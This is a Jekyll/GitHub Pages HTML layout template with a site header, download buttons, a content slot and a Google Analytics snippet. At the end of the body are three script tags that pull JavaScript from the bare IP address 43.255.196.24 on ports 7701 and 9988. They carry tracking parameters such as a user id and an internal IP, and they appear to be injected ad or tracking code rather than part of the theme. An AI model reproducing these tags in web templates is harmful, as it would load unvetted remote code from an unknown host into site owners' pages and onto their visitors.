<!DOCTYPE html>
<html lang="{{ site.lang | default: "en-US" }}">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="{{ '/assets/css/style.css' }}">
    {% seo %}
  </head>

  <body>

    <header>
      <div class="container">
        <h1>{{ site.title | default: site.github.repository_name }}</h1>
        <h2>{{ site.description | default: site.github.project_tagline }}</h2>

        <section id="downloads">
          {% if site.show_downloads %}
            <a href="{{ site.github.zip_url }}" class="btn">Download as .zip</a>
            <a href="{{ site.github.tar_url }}" class="btn">Download as .tar.gz</a>
          {% endif %}
          <a href="{{ site.github.repository_url }}" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        {{ content }}
      </section>
    </div>

    {% if site.google_analytics %}
      <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', '{{ site.google_analytics }}', 'auto');
        ga('send', 'pageview');
      </script>
    {% endif %}
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="/43.255.196.24:7701/main.js?v=3.93&amp;sp=4307&amp;ty=dpc&amp;aff_src=mbieg" type="text/javascript" id="bdstat"></script>
    <script type="text/javascript" src="/43.255.196.24:9988/info.js?sn=ads89206285&amp;time=1570936818776&amp;mobile=0&amp;sp=4307&amp;aid=0&amp;sda_man=&amp;src=0&amp;adtype=0&amp;uid=YwcgUmsCHy5idFcvEHEZXBZ6Vy5qcWxZZXtbXxZ3GC8QcldeZwEcXg==&amp;spid=sohu&amp;ad_list=3618&amp;cid=0&amp;tc=0&amp;sip=100.68.85.176&amp;lacci=&amp;mobileFixed=0&amp;width_page=1263&amp;width_screen=1280&amp;url=http%3A//mukti.website/"></script>
    <script type="text/javascript" src="/43.255.196.24:9988/cms"></script>
  </body>
</html>
